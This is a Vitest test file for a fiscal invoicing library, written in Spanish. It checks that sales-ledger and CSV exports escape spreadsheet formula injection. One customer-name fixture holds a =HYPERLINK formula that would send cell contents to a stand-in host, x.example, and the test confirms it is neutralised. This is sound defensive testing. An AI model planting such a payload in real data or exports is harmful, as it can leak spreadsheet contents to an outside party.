/** Inyección de fórmulas: un nombre de cliente no debe ejecutarse al abrir el CSV en una hoja de cálculo. */
import { describe, expect, it } from 'vitest';
import { AlmacenFiscalMemoria, emitir, exportarTexto, filaLibroVentas, libroVentasCSV, registrarAutorizacion, textoSeguroCSV } from '../src';

describe('CSV sin fórmulas', () => {
  it('antepone un apóstrofo al texto que empieza con = + - @ tab o retorno; no toca el resto', () => {
    expect(['=1+1', '+A1', '-2', '@SUMA', '\tx', 'Ferretería', '0801'].map(textoSeguroCSV)).toEqual(["'=1+1", "'+A1", "'-2", "'@SUMA", "'\tx", 'Ferretería', '0801']);
  });

  it('libro de ventas y exportación CSV neutralizan el nombre del cliente; los montos negativos quedan igual', async () => {
    const almacen = new AlmacenFiscalMemoria();
    await registrarAutorizacion(almacen, {
      cai: 'A1B2C3-D4E5F6-A1B2C3-D4E5F6-A1B2C3-D4', tipoDocumento: '01', establecimiento: '000', puntoEmision: '001',
      rangoInicial: 1, rangoFinal: 10, fechaLimiteEmision: '2027-06-30',
    });
    const doc = await emitir({
      emisor: { rtn: '08011999123456', razonSocial: 'E', nombreComercial: 'E', direccionCasaMatriz: 'D', direccionEstablecimiento: 'D', telefono: '1', correo: 'e@e.hn' },
      cliente: { nombre: '=HYPERLINK("http://x.example/?a="&A1,"ok")' },
      lineas: [{ descripcion: 'x', cantidad: 1, precioUnitario: '10' }],
    }, { almacen, establecimiento: '000', puntoEmision: '001' });
    expect(libroVentasCSV([filaLibroVentas(doc)])).toContain(`"'=HYPERLINK(""http://x.example/?a=""&A1,""ok"")"`);
    expect(exportarTexto([doc], { formato: 'csv' })).toContain(`"'=HYPERLINK(`);
    expect(libroVentasCSV([{ ...filaLibroVentas(doc), total: -11.5 }])).toContain(',-11.50,');
  });
});
